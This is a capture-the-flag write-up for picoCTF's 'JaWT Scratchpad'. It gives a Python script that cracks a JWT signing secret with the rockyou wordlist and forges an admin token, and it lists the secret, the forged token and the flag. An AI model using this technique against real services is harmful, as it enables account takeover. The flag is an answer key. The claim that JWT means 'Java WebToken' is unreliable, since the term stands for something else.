## JaWT Scratchpad (400)

#### Description
> Check the admin scratchpad! https://2019shell1.picoctf.com/problem/47301/ or http://2019shell1.picoctf.com:47301

#### Hint
> What is that cookie?
> Have you heard of JWT?

#### Solution
Submit form with the name "RootHunter". We got a cookie `jwt` with the value:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiUm9vdEh1bnRlciJ9.Wg_9qTDnZEVVLzq3anzAD2SXWI_nBYu_RO9L2QVEW3s
```
JWT means [Java WebToken](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6). 
Look into the index page, we will see a link to **John the Ripper**. That means we have to break the key. I choose to use this library [PyJWT](https://github.com/jpadilla/pyjwt) to implement the JWT and crack it with `rockyou.txt`.

```python
#!/usr/bin/python3
import jwt

rockyou = open("/usr/share/wordlists/rockyou.txt","r",encoding = "ISO-8859-1").read().split("\n")
jwtTrue = b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiUm9vdEh1bnRlciJ9.Wg_9qTDnZEVVLzq3anzAD2SXWI_nBYu_RO9L2QVEW3s'
for secret in rockyou:
    # secret = b"ilovepico"
    encoded = jwt.encode({"user": "RootHunter"}, secret, algorithm='HS256')
    if (encoded == jwtTrue):
        print("The secret is: ",secret.decode("utf-8"))
        encoded = jwt.encode({"user": "admin"}, secret, algorithm='HS256')
        print("The payload to admin: ",encoded.decode("utf-8"))
        break
```

After a few minutes, we got the key and the payload to get flag:
```
The secret is:  b'ilovepico'
The payload to admin:  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```


#### Flag
`picoCTF{jawt_was_just_what_you_thought_be9ef99e529597da0f3543893357908b}`